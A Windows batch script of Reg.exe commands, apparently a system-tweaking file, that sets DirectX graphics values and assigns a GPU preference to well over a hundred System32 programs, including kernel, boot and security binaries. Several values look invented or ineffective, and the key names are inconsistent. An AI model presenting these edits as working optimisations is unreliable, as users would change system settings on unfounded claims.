Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencyPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuRenderingPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "SpreadPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FC-984B-11ED-9501-806E6F6E6963}" /v "GPMinCores" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FE-984B-11ED-9501-806E6F6E6963}" /v "GPUMaxCores" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FE-984B-11ED-9501-806E6F6E6963}" /v "GPUMinCores1" /t REG_DWORD /d "0" /f  
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SecurityHealthService.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Windows.Media.BackgroundPlayback.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sfc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wusa.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\wbemtest.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\scrcons.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ApplyTrustOffline.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CustomInstallExec.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\deploymentcsphelper.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\expand.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ReAgentc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RelPost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MuiUnattend.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dxdiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fontdrvhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winlogon.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ucsvc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fltMC.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lsass.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ntoskrnl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\services.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\smss.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\csrss.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Boot\winload.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\AggregatorHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dtdump.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\runexehelper.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rdrleakdiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wpr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\pacjsworker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\userinit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wininit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DeviceCensus.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dllhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\conhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\extrac32.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\makecab.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\svchost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\compact.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dwm.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dcomcnfg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Locator.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Com\MigRegDB.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RpcPing.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\mtstocom.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Com\comrepl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dllhst3g.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\setupcl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\setupugc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wimserv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\chkdsk.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\chkntfs.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wsqmcons.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\autochk.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\browser_broker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\browserexport.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Boot\winresume.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winresume.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winload.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bthudtask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fsquirt.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bitsadmin.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\refsutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\appidcertstorecheck.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\appidpolicyconverter.exe" /t REG_SZ /d "GpuPreference=1;" /f     
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wlanext.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LockScreenContentServer.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SlideToShutDown.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\systray.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RunLegacyCPLElevated.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\control.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fontview.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wifitask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tzutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\w32tm.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dmclient.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dsregcmd.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UtcDecoderHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TpmTool.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\HealthAttestationClientAgent.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TpmInit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CloudNotifications.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemSettingsBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\mofcomp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\unsecapp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\WMIADAP.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\WmiApSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_isv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_ssp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_ssp_isv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\printfilterpipelinesvc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\provtool.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PrintIsolationHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\spoolsv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PinEnrollmentBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WpcTok.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WpcMon.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ApproveChildRequest.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ofdeploy.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DmNotificationBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MDMAgent.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MicrosoftEdgeBCHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Eap3Host.exe" /t REG_SZ /d "GpuPreference=1;" /f 
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\choice.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\clip.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\doskey.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\forfiles.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\print.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\subst.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cttune.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cttunesvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\help.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\msdtc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CastSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UserDataSource.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\curl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tar.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\spaceman.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\spaceutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\EDPCleanup.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MDMAppInstaller.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ARP.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\finger.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\HOSTNAME.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MRINFO.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\NETSTAT.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ROUTE.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sort.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TCPSVCS.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\xcopy.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\auditpol.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\mountvol.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\net.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\net1.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\netsh.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PATHPING.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PING.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\reg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\setx.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TRACERT.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\attrib.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ClipUp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\diskusage.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\findstr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\icacls.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ipconfig.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CIDiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\comp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fsutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\recover.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sdclt.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PerceptionSimulation\PerceptionSimulationService.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tcblaunch.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\securekernel.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SgrmBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SgrmLpac.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\upnpcont.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\BioIso.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\NgcIso.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dusmtask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\oobeldr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\windeploy.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\audit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\AuditShD.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MBR2GPT.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\Setup.exe" /t REG_SZ /d "GpuPreference=1;" /f   
